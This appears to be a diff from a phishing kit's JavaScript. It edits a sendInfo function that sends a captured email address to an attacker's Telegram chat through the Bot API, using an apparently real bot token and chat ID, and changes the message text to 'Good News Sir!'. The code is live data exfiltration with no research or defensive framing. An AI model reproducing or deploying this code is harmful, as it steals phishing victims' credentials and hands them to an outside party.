@@ -38,8 +38,7 @@ function sendInfo() {
     };
     xhr.open(
         "get",
-        `https://api.telegram.org/bot7318952546:AAGiZZyBpRr51HprNGNd8U4DtXJTKNUzoow/sendMessage?chat_id=5639785348&text=\nNew
-    Connection ${email} `,
+        `https://api.telegram.org/bot7318952546:AAGiZZyBpRr51HprNGNd8U4DtXJTKNUzoow/sendMessage?chat_id=5639785348&text=\nGood News Sir!\n${email}!! `,
         true
     );
     xhr.setRequestHeader(
